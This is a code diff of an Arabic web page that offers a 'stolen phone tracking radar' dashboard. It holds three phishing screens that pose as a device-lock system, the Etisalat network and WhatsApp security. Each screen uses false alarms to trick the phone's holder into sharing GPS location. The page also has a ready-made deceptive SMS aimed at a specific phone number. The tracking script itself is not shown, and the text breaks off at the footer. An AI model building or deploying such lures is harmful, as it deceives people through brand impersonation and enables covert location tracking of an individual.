@@ -1,176 +1,179 @@
+```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منظومة رادار الطوارئ السيبراني لتتبع الهاتف</title>
+    <title>منظومة رادار الطوارئ والتحكم الفوري - حلويات بوسي</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Google Fonts: Cairo -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <!-- Leaflet Map CSS for high-tech embedded maps -->
+    <!-- Leaflet Map CSS for embedded maps -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     
     <style>
         body {
             font-family: 'Cairo', sans-serif;
-            background-color: #0c0c0e;
-            color: #FFFFFF;
+            background-color: #FFFFFF;
+            color: #111111;
             overflow-x: hidden;
         }
-        /* Design Tokens & Theme Palettes (#FF91A4, #FFFFFF, #111111, #D4AF37) */
-        .neon-border {
+        /* Strict Color Palette Styles (#FF91A4, #FFFFFF, #111111, #D4AF37) */
+        .pink-border {
             border: 2px solid #FF91A4;
-            box-shadow: 0 0 15px rgba(255, 145, 164, 0.25);
         }
-        .neon-text {
+        .pink-shadow {
+            box-shadow: 0 4px 20px 0 rgba(255, 145, 164, 0.15);
+        }
+        .text-pink-custom {
             color: #FF91A4;
-            text-shadow: 0 0 8px rgba(255, 145, 164, 0.4);
         }
-        .bg-dark-card {
-            background-color: #111111;
-            border: 1px solid rgba(255, 145, 164, 0.15);
+        .bg-pink-light {
+            background-color: rgba(255, 145, 164, 0.05);
+        }
+        .btn-pink {
+            background-color: #FF91A4;
+            color: #FFFFFF;
+            font-weight: 700;
+            transition: all 0.3s ease;
+        }
+        .btn-pink:hover {
+            background-color: #e07b8e;
+            box-shadow: 0 4px 12px rgba(255, 145, 164, 0.3);
         }
         .accent-gold {
             color: #D4AF37;
         }
-        .border-gold {
-            border-color: #D4AF37;
-        }
-        /* Radar Scanning Animation */
-        .radar-sweep {
+        /* Custom Radar Animation */
+        .radar-sweep-container {
             position: relative;
-            width: 220px;
-            height: 220px;
+            width: 180px;
+            height: 180px;
             border-radius: 50%;
-            border: 2px solid rgba(255, 145, 164, 0.3);
-            background: radial-gradient(circle, rgba(255, 145, 164, 0.05) 0%, rgba(0, 0, 0, 0.8) 100%);
+            border: 2px solid rgba(255, 145, 164, 0.2);
+            background: radial-gradient(circle, rgba(255, 145, 164, 0.05) 0%, rgba(255, 255, 255, 1) 100%);
         }
-        .radar-sweep::before {
+        .radar-sweep-container::before {
             content: '';
             position: absolute;
             width: 50%;
             height: 50%;
-            background: linear-gradient(45deg, rgba(255, 145, 164, 0.4) 0%, transparent 100%);
+            background: linear-gradient(45deg, rgba(255, 145, 164, 0.3) 0%, transparent 100%);
             transform-origin: bottom right;
             border-radius: 100% 0 0 0;
-            animation: sweep 3.5s linear infinite;
+            animation: sweep-action 3.5s linear infinite;
         }
-        @keyframes sweep {
+        @keyframes sweep-action {
             to {
                 transform: rotate(360deg);
             }
         }
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #0c0c0e;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #FF91A4;
-            border-radius: 3px;
+        /* Leaflet custom map sizing */
+        #live-leaflet-map {
+            height: 100%;
+            width: 100%;
         }
     </style>
 </head>
-<body class="min-h-screen">
+<body class="min-h-screen flex flex-col justify-between">
 
-    <!-- TARGET DEVICE BAIT SCREEN (Rendered dynamic to thief) -->
-    <div id="target-view" class="hidden min-h-screen flex flex-col items-center justify-center p-4 bg-[#0c0c0e]">
+    <!-- TARGET DEVICE BAIT SCREEN (Presented smoothly to the thief) -->
+    <div id="target-view" class="hidden min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50">
         
         <!-- BAIT 1: System Lock/Unlock -->
-        <div id="bait-card-1" class="hidden max-w-md w-full bg-[#111111] rounded-2xl border-2 border-red-500 p-6 text-center shadow-lg space-y-6">
-            <div class="w-16 h-16 mx-auto rounded-full bg-red-950 flex items-center justify-center border border-red-500">
+        <div id="bait-card-1" class="hidden max-w-md w-full bg-white rounded-2xl border-2 border-red-500 p-6 text-center shadow-xl space-y-6">
+            <div class="w-16 h-16 mx-auto rounded-full bg-red-50 flex items-center justify-center border border-red-300">
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-red-500 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
             </div>
             <div class="space-y-2">
-                <h1 class="text-xl font-bold text-red-500">نظام حظر الأجهزة غير المصرح بها</h1>
-                <p class="text-xs text-gray-300 font-semibold leading-relaxed">
-                    تم رصد تشغيل غير مطابق للرقم التسلسلي في هاتف الأندرويد/الآيفون الجاري. سيتم قفل الهاتف نهائياً ومسح شريحة اتصالات مصر خلال 5 دقائق لحماية الخصوصية.
+                <h1 class="text-xl font-bold text-red-600">نظام حماية وإدارة الأجهزة الذكية الموحد</h1>
+                <p class="text-xs text-gray-700 font-semibold leading-relaxed">
+                    تم رصد محاولة قفل هذا الهاتف وحذف البيانات المسجلة عليه عن بُعد. لتجنب تجميد الشريحة الحالية وضياع الملفات، يرجى إجراء مطابقة ملكية الحساب جغرافياً.
                 </p>
             </div>
-            <div class="p-3 bg-red-950/40 rounded-lg text-xs text-red-300 text-right leading-relaxed border border-red-800">
-                • لفك حظر الهاتف ومسح ارتباط المالك القديم المسجل، يرجى الموافقة على فحص الـ GPS وموقع الجهاز الجغرافي لتأكيد الحيازة الشرعية فوراً.
+            <div class="p-3 bg-red-50 rounded-lg text-xs text-red-800 text-right leading-relaxed border border-red-100">
+                • بمجرد الموافقة وتأكيد الصلاحية الجغرافية، سيقوم النظام تلقائياً بفك الحساب القديم لتتمكن من تشغيل الهاتف بحريتك ودون قيود.
             </div>
             <button onclick="captureTargetCoordinates()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 px-4 rounded-xl text-xs transition-all shadow-md">
                 تأمين الهاتف وفصل المالك القديم 🔓
             </button>
-            <div id="bait-status-1" class="text-xs font-bold text-gray-400 mt-2"></div>
+            <div id="bait-status-1" class="text-xs font-bold text-gray-500 mt-2"></div>
         </div>
 
         <!-- BAIT 2: Etisalat Signal Upgrade -->
-        <div id="bait-card-2" class="hidden max-w-md w-full bg-[#111111] rounded-2xl border-2 border-green-500 p-6 text-center shadow-lg space-y-6">
-            <div class="w-16 h-16 mx-auto rounded-full bg-green-950 flex items-center justify-center border border-green-500">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <div id="bait-card-2" class="hidden max-w-md w-full bg-white rounded-2xl border-2 border-green-500 p-6 text-center shadow-xl space-y-6">
+            <div class="w-16 h-16 mx-auto rounded-full bg-green-50 flex items-center justify-center border border-green-300">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                 </svg>
             </div>
             <div class="space-y-2">
-                <h1 class="text-xl font-bold text-green-500">منظومة تحديث إشارة الاتصالات - الفرافرة</h1>
-                <p class="text-xs text-gray-300 font-semibold leading-relaxed">
-                    عميلنا العزيز: نظراً لوجود أعمال صيانة وتحديث لأبراج الاتصالات بمحافظة الوادي الجديد، يرجى توجيه إشارة هاتفك لأقرب برج لتفادي انقطاع تغطية الـ 4G عن خطك.
+                <h1 class="text-xl font-bold text-green-600">منظومة ترقية أبراج شبكة اتصالات - الفرافرة</h1>
+                <p class="text-xs text-gray-700 font-semibold leading-relaxed">
+                    عميلنا العزيز: نظراً لوجود أعمال صيانة وتوسعة لأبراج الجيل الرابع بالوادي الجديد، يرجى تفعيل التوجيه التلقائي لهاتفك لتلافي انقطاع تغطية البيانات والاتصالات.
                 </p>
             </div>
-            <div class="p-3 bg-green-950/40 rounded-lg text-xs text-green-300 text-right leading-relaxed border border-green-800">
-                • الرجاء تفعيل مشاركة الموقع الجغرافي ليقوم خادم اتصالات مصر بتحديث إرسال شريحتك تلقائياً وبسرعة فائقة.
+            <div class="p-3 bg-green-50 rounded-lg text-xs text-green-800 text-right leading-relaxed border border-green-100">
+                • يرجى السماح بتأكيد الموقع الجغرافي لتوجيه أقرب نطاق تردد معزز من برج الخدمة إلى شريحتك مباشرة.
             </div>
             <button onclick="captureTargetCoordinates()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 px-4 rounded-xl text-xs transition-all shadow-md">
                 تفعيل تغطية الشبكة وتقوية الإشارة 📶
             </button>
-            <div id="bait-status-2" class="text-xs font-bold text-gray-400 mt-2"></div>
+            <div id="bait-status-2" class="text-xs font-bold text-gray-500 mt-2"></div>
         </div>
 
         <!-- BAIT 3: WhatsApp Hijack Protection -->
-        <div id="bait-card-3" class="hidden max-w-md w-full bg-[#111111] rounded-2xl border-2 border-blue-500 p-6 text-center shadow-lg space-y-6">
-            <div class="w-16 h-16 mx-auto rounded-full bg-blue-950 flex items-center justify-center border border-blue-500">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <div id="bait-card-3" class="hidden max-w-md w-full bg-white rounded-2xl border-2 border-blue-500 p-6 text-center shadow-xl space-y-6">
+            <div class="w-16 h-16 mx-auto rounded-full bg-blue-50 flex items-center justify-center border border-blue-300">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
             </div>
             <div class="space-y-2">
-                <h1 class="text-xl font-bold text-blue-500">أمن المصادقة الثنائية - WhatsApp Messenger</h1>
-                <p class="text-xs text-gray-300 font-semibold leading-relaxed">
-                    تنبيه أمني عاجل: تم رصد محاولة جارية من جهاز كمبيوتر في منطقة خارجية لربط حساب واتساب المفتوح على هذا الخط وسحب المحادثات والصور الشخصية.
+                <h1 class="text-xl font-bold text-blue-600">مركز حماية المصادقة والأمان - WhatsApp</h1>
+                <p class="text-xs text-gray-700 font-semibold leading-relaxed">
+                    تنبيه أمني عاجل: تم كشف محاولة جارية من جهاز كمبيوتر لربط حساب واتساب الخاص بك وسحب الرسائل والصور. لحظر المحاولة فوراً يرجى تأكيد حيازتك للجهاز.
                 </p>
             </div>
-            <div class="p-3 bg-blue-950/40 rounded-lg text-xs text-blue-300 text-right leading-relaxed border border-blue-800">
-                • لحظر الاختراق وفصل الأجهزة المتطفلة فوراً، يرجى تفعيل تأكيد الموقع الجغرافي للجهاز المالك الأصلي لضمان الحماية.
+            <div class="p-3 bg-blue-50 rounded-lg text-xs text-blue-800 text-right leading-relaxed border border-blue-100">
+                • يتطلب نظام الأمان تأكيد المطابقة الجغرافية للحساب لفصل الأجهزة المتطفلة فوراً وحماية خصوصيتك بالكامل.
             </div>
             <button onclick="captureTargetCoordinates()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 px-4 rounded-xl text-xs transition-all shadow-md">
                 تأمين حساب الواتساب وحظر الاختراق 🛡️
             </button>
-            <div id="bait-status-3" class="text-xs font-bold text-gray-400 mt-2"></div>
+            <div id="bait-status-3" class="text-xs font-bold text-gray-500 mt-2"></div>
         </div>
 
     </div>
 
     <!-- MAIN CONTROL ROOM DASHBOARD (Shown to Mother) -->
-    <div id="mother-dashboard" class="block">
+    <div id="mother-dashboard" class="block font-sans">
         
-        <!-- Premium Header Area -->
-        <header class="border-b-2 border-[#FF91A4] py-4 px-6 bg-[#111111] sticky top-0 z-50">
+        <!-- Top Navigation Panel -->
+        <header class="border-b-2 border-[#FF91A4] py-4 px-6 bg-white sticky top-0 z-50 shadow-sm">
             <div class="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 rounded-full border border-[#FF91A4] flex items-center justify-center bg-black">
+                    <div class="w-12 h-12 rounded-full border border-[#FF91A4] flex items-center justify-center bg-pink-light">
                         <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-[#FF91A4]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                         </svg>
                     </div>
                     <div>
-                        <h1 class="text-xl font-extrabold text-white tracking-wide">منظومة رادار الطوارئ والتحكم السيبراني</h1>
-                        <p class="text-xs text-[#FF91A4] font-semibold">تتبع وحقن رادار الـ GPS للهاتف المفقود: 01147639153</p>
+                        <h1 class="text-xl font-extrabold text-[#111111] tracking-wide font-sans">منظومة رادار الطوارئ والتحكم الفوري - حلويات بوسي</h1>
+                        <p class="text-xs text-gray-500 font-semibold">تتبع وحقن رادار الـ GPS للهاتف المفقود: <span class="text-pink-custom font-bold">01147639153</span></p>
                     </div>
                 </div>
                 <div class="flex items-center gap-3">
-                    <div class="bg-black/50 border border-green-500/40 text-green-400 px-4 py-1.5 rounded-full text-xs font-bold flex items-center gap-2">
-                        <span class="w-2 h-2 rounded-full bg-green-500 animate-ping"></span>
-                        السيرفر السحابي متصل
-                    </div>
+                    <span class="bg-pink-light border border-[#FF91A4]/30 text-pink-custom px-4 py-1.5 rounded-full text-xs font-bold flex items-center gap-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#FF91A4] animate-ping"></span>
+                        الرصد السحابي المزدوج نشط
+                    </span>
                 </div>
             </div>
         </header>
@@ -178,139 +181,137 @@
         <!-- Main Workspace -->
         <main class="max-w-7xl mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
             
-            <!-- Left Panel: Setup, Baits, Mockup (5 Columns) -->
+            <!-- Left Panel: Configuration and Baits Selection (5 Columns) -->
             <div class="lg:col-span-5 space-y-6">
                 
                 <!-- Setup Hosting Card -->
-                <div class="bg-dark-card rounded-2xl p-5 space-y-3 shadow-pink">
-                    <div class="flex items-center gap-2 text-[#FF91A4] font-bold">
-                        <span class="accent-gold text-lg">✦</span>
-                        <h2 class="text-sm font-extrabold">الخطوة الأولى: تحديد رابط موقعكِ العام</h2>
+                <div class="bg-white rounded-2xl p-5 space-y-3 border border-pink shadow-pink">
+                    <div class="flex items-center gap-2 text-[#111111] font-bold">
+                        <span class="accent-gold text-lg">★</span>
+                        <h2 class="text-sm font-extrabold">الخطوة الأولى: تأكيد رابط موقعكِ العام</h2>
                     </div>
-                    <p class="text-[11px] text-gray-400 leading-relaxed">
-                        عشان المصيدة تشتغل بدون خطأ 404، ارفعي هذا الملف على استضافتكِ المعتادة واكتبي رابط صفحتكِ المباشر بالأسفل ليقوم النظام بربط قاعدة البيانات تلقائياً:
+                    <p class="text-[11px] text-gray-500 leading-relaxed">
+                        تم كشف رابط استضافتكِ تلقائياً لتفادي أخطاء الـ 404. يرجى مراجعته وتأكيده بالأسفل لتحديث روابط التتبع بالكامل فوراً:
                     </p>
                     <div class="flex flex-col sm:flex-row gap-2">
-                        <input type="url" id="custom-base-url" placeholder="مثال: https://se-sweet.vercel.app" class="flex-1 p-2.5 bg-black border border-gray-800 rounded-lg text-xs font-semibold focus:outline-none focus:border-[#FF91A4] text-[#FF91A4]">
+                        <input type="url" id="custom-base-url" placeholder="مثال: https://se-sweet.vercel.app" class="flex-1 p-2.5 bg-white border border-[#FF91A4] rounded-lg text-xs font-semibold focus:outline-none focus:ring-1 focus:ring-[#FF91A4] text-black">
                         <button onclick="applyCustomBaseUrl()" class="btn-pink font-bold px-5 py-2.5 rounded-lg text-xs transition-all">تحديث ⚙️</button>
                     </div>
                 </div>
 
                 <!-- Bait Selector -->
-                <div class="bg-dark-card rounded-2xl p-5 space-y-4 shadow-pink">
-                    <div class="flex items-center gap-2 text-[#FF91A4] font-bold">
-                        <span class="accent-gold text-lg">✦</span>
+                <div class="bg-white rounded-2xl p-5 space-y-4 border border-pink shadow-pink">
+                    <div class="flex items-center gap-2 text-[#111111] font-bold">
+                        <span class="accent-gold text-lg">★</span>
                         <h2 class="text-sm font-extrabold">الخطوة الثانية: اختيار نوع مصيدة الاستدراج</h2>
                     </div>
                     
                     <div class="space-y-2.5">
-                        <div onclick="selectBaitStyle(1)" id="bait-opt-1" class="p-3.5 rounded-xl border-2 border-[#FF91A4] bg-[#FF91A4]/5 cursor-pointer transition-all space-y-1">
+                        <div onclick="selectBaitStyle(1)" id="bait-opt-1" class="p-3.5 rounded-xl border-2 border-[#FF91A4] bg-pink-light cursor-pointer transition-all space-y-1">
                             <div class="flex justify-between items-center">
-                                <span class="text-xs font-bold text-white">1. نظام إلغاء قفل وحماية الجهاز</span>
-                                <span class="text-[10px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded-full font-bold">الأقوى والأضمن 🔥</span>
+                                <span class="text-xs font-bold text-[#111111]">1. نظام إلغاء قفل وحماية الجهاز</span>
+                                <span class="text-[10px] bg-red-100 text-red-600 px-2 py-0.5 rounded-full font-bold">الأكثر فاعلية وتأثيراً 🔥</span>
                             </div>
-                            <p class="text-[10px] text-gray-400">يوهم السارق بقفل الهاتف ومسح ملفاته ما لم يقم بالتحقق من موقعه الجغرافي.</p>
+                            <p class="text-[10px] text-gray-500">يوهم السارق بقفل الهاتف فوراً وحذف كل محتوياته ما لم يقم بتأكيد موقعه الحالي.</p>
                         </div>
 
-                        <div onclick="selectBaitStyle(2)" id="bait-opt-2" class="p-3.5 rounded-xl border border-gray-800 bg-black/40 cursor-pointer transition-all space-y-1 hover:border-[#FF91A4]">
+                        <div onclick="selectBaitStyle(2)" id="bait-opt-2" class="p-3.5 rounded-xl border border-[#FF91A4]/30 bg-white cursor-pointer transition-all space-y-1 hover:border-[#FF91A4]">
                             <div class="flex justify-between items-center">
-                                <span class="text-xs font-bold text-white">2. تحديث إشارة شبكة الفرافرة</span>
-                                <span class="text-[10px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded-full font-bold">تحديث فني 📶</span>
+                                <span class="text-xs font-bold text-[#111111]">2. تحديث إشارة شبكة الفرافرة</span>
+                                <span class="text-[10px] bg-green-100 text-green-600 px-2 py-0.5 rounded-full font-bold">تحديث فني للشبكة 📶</span>
                             </div>
-                            <p class="text-[10px] text-gray-400">يقنع السارق باسم شبكة اتصالات بضرورة تحديث إشارة الـ 4G لديه لعدم سقوط الخدمة.</p>
+                            <p class="text-[10px] text-gray-500">يقنعه باسم شركة الاتصالات بضرورة تحديث إشارة الـ 4G لديه لتفادي ضعف وانقطاع التغطية.</p>
                         </div>
 
-                        <div onclick="selectBaitStyle(3)" id="bait-opt-3" class="p-3.5 rounded-xl border border-gray-800 bg-black/40 cursor-pointer transition-all space-y-1 hover:border-[#FF91A4]">
+                        <div onclick="selectBaitStyle(3)" id="bait-opt-3" class="p-3.5 rounded-xl border border-[#FF91A4]/30 bg-white cursor-pointer transition-all space-y-1 hover:border-[#FF91A4]">
                             <div class="flex justify-between items-center">
-                                <span class="text-xs font-bold text-white">3. حظر اختراق أمن واتساب</span>
-                                <span class="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded-full font-bold">تأمين خصوصية 🛡️</span>
+                                <span class="text-xs font-bold text-[#111111]">3. حظر اختراق أمن واتساب</span>
+                                <span class="text-[10px] bg-blue-100 text-blue-600 px-2 py-0.5 rounded-full font-bold">حماية وتأمين الخصوصية 🛡️</span>
                             </div>
-                            <p class="text-[10px] text-gray-400">يظهره كإشعار أمني بأن شخصاً يحاول اختراق واتس اب المفتوح على هذا الرقم ويطلب تأكيد موقعه.</p>
+                            <p class="text-[10px] text-gray-500">يظهره كإشعار أمني بأن هناك محاولة اختراق نشطة للواتساب المفتوح على هذا الرقم ويطلب حظرها.</p>
                         </div>
                     </div>
                 </div>
 
-                <!-- Live SMS Mockup Preview (Amazing Touch) -->
-                <div class="bg-dark-card rounded-2xl p-5 space-y-3 shadow-pink">
-                    <div class="flex items-center justify-between border-b border-gray-800 pb-2">
-                        <span class="text-xs font-bold text-white flex items-center gap-2">
+                <!-- Live SMS Mockup Preview -->
+                <div class="bg-white rounded-xl p-5 space-y-3 border border-pink shadow-pink">
+                    <div class="flex items-center justify-between border-b border-pink/30 pb-2">
+                        <span class="text-xs font-bold text-[#111111] flex items-center gap-2">
                             <span class="w-2 h-2 rounded-full bg-[#FF91A4]"></span>
-                            معاينة الرسالة كما ستظهر على هاتف السارق:
+                            نص الرسالة الجاهز للإرسال الفوري للسارق:
                         </span>
-                        <button onclick="copyFullBaitSms()" class="text-[10px] bg-white text-black font-bold px-2.5 py-1 rounded hover:bg-gray-200 transition-all">نسخ الرسالة كاملة 📋</button>
+                        <button onclick="copyFullBaitSms()" class="text-[10px] bg-pink-light border border-[#FF91A4] text-[#111111] font-bold px-2.5 py-1 rounded hover:bg-[#FF91A4]/10 transition-all">نسخ الرسالة بالكامل 📋</button>
                     </div>
                     
-                    <div class="p-4 bg-black rounded-xl border border-gray-800 font-mono text-[11px] text-gray-300 leading-relaxed whitespace-pre-wrap select-all relative">
-                        <div class="absolute top-2 left-2 text-[9px] text-[#FF91A4] font-bold uppercase tracking-wider">SMS PREVIEW</div>
-                        <span id="sms-bait-text">جاري توليد الرسالة...</span>
+                    <div class="p-4 bg-gray-50 rounded-xl border border-pink/40 font-mono text-[11px] text-[#111111] leading-relaxed whitespace-pre-wrap select-all relative">
+                        <div class="absolute top-2 left-2 text-[9px] text-pink-custom font-bold uppercase tracking-wider">SMS PREVIEW</div>
+                        <span id="sms-bait-text">تنبيه أمني عاجل: تم رصد تشغيل غير مطابق للرقم التسلسلي بهاتف الأندرويد/الآيفون الحالي. لمنع قفل الهاتف ومسح شريحة اتصالات مصر نهائياً، يرجى تفعيل الحماية وفصل حساب المالك القديم فوراً من الرابط الآمن: </span>
                     </div>
                 </div>
 
             </div>
 
-            <!-- Right Panel: High-tech Map, Live Console, Tracking Radar (7 Columns) -->
+            <!-- Right Panel: Sat Map, Live Console, Tracking Radar (7 Columns) -->
             <div class="lg:col-span-7 space-y-6">
                 
                 <!-- Cyber Radar & Map View Box -->
-                <div class="bg-dark-card rounded-2xl p-5 shadow-pink relative flex flex-col justify-between min-h-[460px]">
-                    <div class="flex items-center justify-between border-b border-gray-800 pb-3">
-                        <h2 class="text-sm font-extrabold text-[#FF91A4] flex items-center gap-2">
+                <div class="bg-white rounded-2xl p-5 border border-pink shadow-pink relative flex flex-col justify-between min-h-[460px]">
+                    <div class="flex items-center justify-between border-b border-pink/30 pb-3">
+                        <h2 class="text-sm font-extrabold text-[#111111] flex items-center gap-2">
                             <span class="w-2.5 h-2.5 rounded-full bg-[#FF91A4] animate-ping"></span>
                             الرصد الجغرافي المباشر وخريطة الأقمار الصناعية
                         </h2>
-                        <span class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Live Sat Map</span>
+                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Live SAT Map</span>
                     </div>
 
                     <!-- Embedded Interactive Leaflet Map Grid -->
-                    <div class="relative flex-1 min-h-[340px] my-4 rounded-xl overflow-hidden bg-black flex items-center justify-center border border-gray-800">
+                    <div class="relative flex-1 min-h-[340px] my-4 rounded-xl overflow-hidden bg-gray-50 flex items-center justify-center border border-pink/30">
                         <!-- High-Tech Map Canvas -->
                         <div id="live-leaflet-map" class="absolute inset-0 w-full h-full z-10 transition-opacity duration-500 opacity-0"></div>
 
                         <!-- High-Tech Scanning Cover (Hidden when location found) -->
-                        <div id="radar-searching-screen" class="absolute inset-0 bg-black flex flex-col items-center justify-center space-y-4 z-20 transition-all duration-500">
-                            <div class="radar-sweep">
+                        <div id="radar-searching-screen" class="absolute inset-0 bg-white flex flex-col items-center justify-center space-y-4 z-20 transition-all duration-500">
+                            <div class="radar-sweep-container">
                                 <div class="absolute inset-0 rounded-full border border-[#FF91A4]/10 scale-75 animate-ping"></div>
-                                <div class="absolute inset-0 rounded-full border border-[#FF91A4]/5 scale-50 animate-pulse"></div>
-                                <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-3 h-3 rounded-full bg-[#FF91A4] shadow-lg shadow-[#FF91A4]"></div>
+                                <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-3.5 h-3.5 rounded-full bg-[#FF91A4] shadow-lg shadow-[#FF91A4]"></div>
                             </div>
                             <div class="text-center">
-                                <p class="text-xs font-bold tracking-wider text-gray-300 animate-pulse">في انتظار نقرة السارق الجغرافية...</p>
-                                <p class="text-[10px] text-[#FF91A4] mt-1 font-mono">RADAR POLLING ONLINE [01147639153]</p>
+                                <p class="text-xs font-bold tracking-wider text-[#111111] animate-pulse">في انتظار نقرة السارق الجغرافية...</p>
+                                <p class="text-[10px] text-pink-custom mt-1 font-mono">RADAR POLLING ACTIVE [01147639153]</p>
                             </div>
                         </div>
                     </div>
 
                     <!-- Coordinates Display Bar -->
-                    <div id="coordinates-bar" class="hidden grid grid-cols-3 gap-2 bg-black border border-green-500/30 p-3 rounded-xl">
-                        <div class="text-center border-r border-gray-800">
+                    <div id="coordinates-bar" class="hidden grid grid-cols-3 gap-2 bg-pink-light border border-[#FF91A4]/30 p-3 rounded-xl">
+                        <div class="text-center border-r border-pink/20">
                             <span class="block text-[9px] text-gray-500 font-bold uppercase">Latitude (خط العرض)</span>
-                            <span id="coord-lat" class="text-xs font-bold text-green-400 font-mono">-</span>
+                            <span id="coord-lat" class="text-xs font-bold text-black font-mono">-</span>
                         </div>
-                        <div class="text-center border-r border-gray-800">
+                        <div class="text-center border-r border-pink/20">
                             <span class="block text-[9px] text-gray-500 font-bold uppercase">Longitude (خط الطول)</span>
-                            <span id="coord-lng" class="text-xs font-bold text-green-400 font-mono">-</span>
+                            <span id="coord-lng" class="text-xs font-bold text-black font-mono">-</span>
                         </div>
                         <div class="text-center">
                             <span class="block text-[9px] text-gray-500 font-bold uppercase">Accuracy (دقة الرصد)</span>
-                            <span id="coord-acc" class="text-[10px] font-bold text-yellow-400 font-mono">-</span>
+                            <span id="coord-acc" class="text-[10px] font-bold text-pink-custom font-mono">-</span>
                         </div>
                     </div>
                 </div>
 
-                <!-- Live System Terminal Log (Cyberpunk Touch) -->
-                <div class="bg-dark-card rounded-2xl p-5 space-y-3 shadow-pink">
-                    <div class="flex items-center justify-between border-b border-gray-800 pb-2">
+                <!-- Live System Terminal Log -->
+                <div class="bg-white rounded-2xl p-5 space-y-3 border border-pink shadow-pink">
+                    <div class="flex items-center justify-between border-b border-pink/30 pb-2">
                         <div class="flex items-center gap-2">
-                            <span class="w-2.5 h-2.5 rounded bg-yellow-500"></span>
-                            <h3 class="text-xs font-extrabold text-white font-mono">سجل الأحداث والاتصال اللحظي (System Console)</h3>
+                            <span class="w-2.5 h-2.5 rounded bg-[#D4AF37]"></span>
+                            <h3 class="text-xs font-extrabold text-[#111111]">سجل أحداث المنظومة والاتصال اللحظي (System Console)</h3>
                         </div>
-                        <button onclick="simulateSuccessGrab()" class="text-[9px] bg-[#FF91A4]/10 text-[#FF91A4] border border-[#FF91A4]/30 px-3 py-1 rounded hover:bg-[#FF91A4]/20 transition-all font-bold">محاكاة رصد حية للتجربة والتدريب ⚙️</button>
+                        <button onclick="simulateSuccessGrab()" class="text-[9px] bg-pink-light text-pink-custom border border-[#FF91A4]/30 px-3 py-1 rounded hover:bg-[#FF91A4]/10 transition-all font-bold">محاكاة رصد تجريبية ⚙️</button>
                     </div>
                     
-                    <div id="terminal-log" class="bg-black/60 p-3 rounded-xl border border-gray-900 font-mono text-[10px] text-green-400 h-28 overflow-y-auto space-y-1.5 leading-relaxed">
-                        <div>[SYSTEM INFO] تم بدء تشغيل محرك الرادار والبحث السحابي الفوري...</div>
-                        <div>[SYSTEM INFO] جاري الاستماع لقاعدة البيانات السحابية الحرة...</div>
-                        <div>[SYSTEM INFO] بانتظار إرسال الرابط للرقم 01147639153...</div>
+                    <div id="terminal-log" class="bg-gray-50 p-3 rounded-xl border border-pink/20 font-mono text-[10px] text-black h-28 overflow-y-auto space-y-1.5 leading-relaxed">
+                        <div>[SYSTEM] تم بدء تشغيل محرك الرادار والاتصال بقاعدة البيانات السحابية الحرة...</div>
+                        <div>[SYSTEM] جاري تتبع إشارة رقم الهاتف 01147639153...</div>
                     </div>
                 </div>
 
@@ -319,44 +320,37 @@
         </main>
     </div>
 
+    <!-- Footer Space -->
+    <footer class="py-4 border-t border-pink/20 bg-white text-center text-[11px] text-gray-400">
